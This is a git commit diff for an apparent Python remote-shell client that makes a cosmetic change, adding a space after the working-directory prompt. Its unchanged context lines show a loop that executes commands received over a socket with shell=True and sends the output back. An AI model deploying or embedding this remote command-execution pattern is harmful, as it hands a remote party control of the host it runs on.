a0d41be859e387ed1e2daf8f5c36c19fa47d0bec
madison <69394836+xorsirenz@users.noreply.github.com>
2024-11-19 09:14:52 -0700

    added spacechar after cwd

--- client-side/client_server.py
+++ client-side/client_server.py
@@ -16,7 +16,7 @@ while True:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes, "utf-8")
-        s.send(str.encode(output_str + str(f"[{os.getcwd()}]$")))
+        s.send(str.encode(output_str + str(f"[{os.getcwd()}]$ ")))
 
 s.close()
 
